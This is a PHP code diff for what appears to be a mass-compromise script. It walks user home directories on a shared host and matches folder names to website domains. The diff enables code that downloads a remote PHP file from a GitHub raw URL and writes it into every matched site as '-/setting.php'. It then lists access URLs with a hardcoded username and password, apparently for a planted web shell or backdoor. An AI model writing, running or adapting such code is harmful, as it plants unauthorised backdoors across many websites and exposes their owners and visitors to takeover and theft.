@@ -21,7 +21,7 @@ foreach ($homes as $key => $home) {
     foreach ($paths as $path) {
 
         $currentDomain = str_replace('_', '.', $path);
-        if (in_array($currentDomain, $domains)) {
+        if (in_array($currentDomain, $domains) && $home != 'root') {
             $targets[] = [
                 'path' => $currentPath . $path,
                 'domain' => $currentDomain,
@@ -34,11 +34,13 @@ $results = [];
 
 foreach ($targets as $target) {
     $dir = $target['path'] . '/-';
-    // mkdir($target['path'] . '/-');
+    if (!file_exists($dir)) {
+        mkdir($dir);
+    }
 
-    // $response = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/legacy.php');
-    // $file = $target['path'] . '/-/setting.php';
-    // $res = file_put_contents($file, $response);
+    $response = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/legacy.php');
+    $file = $target['path'] . '/-/setting.php';
+    $res = file_put_contents($file, $response);
 
     // $results[$target['domain']] = [
     //     'size' => $res,
@@ -47,9 +49,7 @@ foreach ($targets as $target) {
     //     'url' => $target['domain'] . '/-/setting.php'
     // ];
 
-    if (!isset($results[$target['domain']])) {
-        $results[$dir] = file_exists($dir) && is_dir($dir);
-    }
+    $results[] = $target['domain'] . '/-/setting.php?user=grimreaper&password=grimreaper123@';
 }
 
 dd($results);
